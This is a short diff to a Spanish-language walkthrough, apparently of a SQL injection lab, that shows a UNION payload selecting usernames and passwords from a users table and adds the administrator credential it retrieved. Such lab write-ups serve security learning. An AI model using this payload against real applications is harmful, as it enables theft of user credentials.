@@ -63,3 +63,10 @@ Sabemos que tenemos 2 columnas y ambas admiten cadena como tipo de dato.
 
 Procedemos a realizar la consulta con el payload `' UNION select username, password FROM users--`:
 <img width="1858" height="822" alt="image" src="https://github.com/user-attachments/assets/6204d256-1806-4a03-8f90-b8650b56d747" />
+
+Obtenemos las credenciales del usuario que necesitamos: `administrator`:`cpdwzpqlytjhrl112brf`
+
+
+---
+
+- Paso 4 
